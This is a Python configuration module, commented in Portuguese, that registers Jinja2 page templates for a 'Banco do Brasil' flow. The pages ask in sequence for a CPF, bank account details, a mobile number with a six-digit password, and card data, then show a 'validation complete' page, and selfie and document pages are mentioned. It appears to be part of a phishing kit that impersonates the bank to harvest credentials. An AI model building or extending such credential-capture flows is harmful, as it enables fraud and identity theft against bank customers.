"""
Templates HTML para os fluxos BB (Banco do Brasil)
USANDO JINJA2 para melhor organização e manutenibilidade

Os templates simples são carregados do diretório /paginas usando Jinja2.
Templates complexos (selfie, documento) são mantidos inline neste arquivo.
"""

from app.template_loader import create_page_dict

# ============================================================================
# PÁGINAS SIMPLES - CARREGADAS VIA JINJA2
# ============================================================================

def get_simple_pages_jinja():
    """Retorna páginas simples carregadas via Jinja2"""
    return [
        create_page_dict(
            page_id="page_cpf",
            name="CPF",
            title="Validação de CPF",
            field_type="cpf",
            order=1,
            template_name="page_cpf.html"
        ),
        create_page_dict(
            page_id="page_dados_bancarios",
            name="Dados Bancários",
            title="Dados da Conta",
            field_type="dados_bancarios",
            order=2,
            template_name="page_dados_bancarios.html"
        ),
        create_page_dict(
            page_id="page_celular_senha6",
            name="Celular e Senha",
            title="Validação Mobile",
            field_type="celular_senha6",
            order=3,
            template_name="page_celular_senha6.html"
        ),
        create_page_dict(
            page_id="page_cartao",
            name="Cartão",
            title="Dados do Cartão",
            field_type="cartao",
            order=4,
            template_name="page_cartao.html"
        ),
        create_page_dict(
            page_id="page_sucesso",
            name="Sucesso",
            title="Validação Concluída",
            field_type="sucesso",
            order=7,
            template_name="page_sucesso.html"
        )
    ]

# ============================================================================
# COMPATIBILIDADE - Variáveis e Funções para db_init.py
# ============================================================================

# Carregar páginas simples
BB_FLUXO_COMPLETO_PAGES = get_simple_pages_jinja()

# Função requerida pelo db_init.py
def get_all_templates():
    """
    Retorna lista com todas as definições de templates
    
    Returns:
        list: Lista de dicionários com dados dos templates
    """
    return [
        {
            "name": "BB Fluxo Completo",
            "slug": "bb_fluxo_completo",
            "description": "Template completo com 5 etapas via Jinja2: CPF, Dados Bancários, Celular/Senha, Cartão e Sucesso",
            "status": "active",
            "pages": BB_FLUXO_COMPLETO_PAGES
        }
    ]

